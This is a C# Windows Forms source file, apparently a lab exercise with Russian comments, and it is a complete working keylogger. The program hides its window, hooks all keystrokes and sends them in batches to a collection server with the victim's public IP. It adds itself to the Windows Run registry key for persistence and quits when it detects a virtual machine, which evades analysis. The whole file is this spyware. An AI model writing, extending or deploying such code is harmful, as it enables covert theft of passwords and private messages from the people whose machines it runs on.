using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Management;

namespace lab2
{
    public partial class Form1 : Form
    {
        private const string serverUrl = "http://localhost:3000/submit-data";
        private const int MaxBufferLength = 20;
        private const string appName = "MyProgramName"; // Имя вашей программы
        private const string runKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

        private StringBuilder buffer = new StringBuilder();
        private LowLevelKeyboardProc _proc;
        private static IntPtr _hookID = IntPtr.Zero;

        public Form1()
        {
            InitializeComponent();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Visible = false;
            _proc = HookCallback;
            HookKeyboard();

            // Проверяем, была ли программа запущена ранее
            if (!IsFirstRun())
            {
                AddToStartup();
            }

            // Проверяем, запущена ли программа на виртуальной машине
            if (IsVirtualMachine())
            {
                MessageBox.Show("Программа не может быть запущена на виртуальной машине.");
                Application.Exit();
            }
        }

        private bool IsFirstRun()
        {
            // Проверяем наличие ключа в реестре
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(runKeyPath, true))
            {
                return key.GetValue(appName) != null;
            }
        }

        private void AddToStartup()
        {
            // Добавляем ключ в реестр для автозагрузки
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(runKeyPath, true))
            {
                key.SetValue(appName, Application.ExecutablePath);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnhookKeyboard();
        }

        private void HookKeyboard()
        {
            _hookID = SetHook(_proc);
        }

        private void UnhookKeyboard()
        {
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Form1 form = Application.OpenForms[0] as Form1;

                StringBuilder sb = new StringBuilder();
                byte[] keyState = new byte[256];
                GetKeyboardState(keyState);

                bool shiftPressed = (keyState[(int)Keys.ShiftKey] & 0x80) != 0;
                bool capsLock = Control.IsKeyLocked(Keys.CapsLock);

                uint virtualKey = (uint)vkCode;
                uint scanCode = MapVirtualKey(virtualKey, MAPVK_VK_TO_VSC);

                StringBuilder stringBuilder = new StringBuilder(5);
                int result = ToUnicode(virtualKey, scanCode, keyState, stringBuilder, stringBuilder.Capacity, 0);

                if (result > 0)
                {
                    string keyPressed = stringBuilder.ToString();

                    if (shiftPressed ^ capsLock)
                    {
                        keyPressed = keyPressed.ToUpper();
                    }
                    else
                    {
                        keyPressed = keyPressed.ToLower();
                    }

                    form.AddToBuffer(keyPressed);
                }
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void AddToBuffer(string key)
        {
            buffer.Append(key);
            if (buffer.Length >= MaxBufferLength)
            {
                SendDataToServer(buffer.ToString());
                buffer.Clear();
            }
        }

        private string GetIPAddress()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    return wc.DownloadString("http://api.ipify.org");
                }
            }
            catch (Exception ex)
            {
                return $"Error getting IP address: {ex.Message}";
            }
        }


        private void SendDataToServer(string data)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(serverUrl);
                request.Method = "POST";
                request.ContentType = "application/json";
                request.Timeout = 5000;
                string ipAddress = GetIPAddress();
                string postData = $"{{ \"data\": \"{EscapeString(data)}\" ,\"ip\": \"{ipAddress}\" }}";
                byte[] byteArray = Encoding.UTF8.GetBytes(postData);
                request.ContentLength = byteArray.Length;
                using (Stream dataStream = request.GetRequestStream())
                {
                    dataStream.Write(byteArray, 0, byteArray.Length);
                }
                using (WebResponse response = request.GetResponse())
                {
                    // Handle response if needed
                }
                LogToFile($"Data sent successfully: {data}");
            }
            catch (Exception ex)
            {
                LogToFile($"Error sending data to server: {ex.Message}");
            }
        }

        private string EscapeString(string input)
        {
            // Escape double quotes in the input string
            return input.Replace("\"", "\\\"");
        }

        private void LogToFile(string message)
        {
            try
            {
                string logFile = "log.txt";
                string logMessage = $"{DateTime.Now}: {message}\n";
                File.AppendAllText(logFile, logMessage);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error writing to log file: {ex.Message}");
            }
        }

        private bool IsVirtualMachine()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && obj["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
                            manufacturer.Contains("vmware") || manufacturer.Contains("oracle"))
                        {
                            return true;
                        }
                    }
                }
                return false;
            }
            catch
            {
                return false;
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const uint MAPVK_VK_TO_VSC = 0x00;
    }
}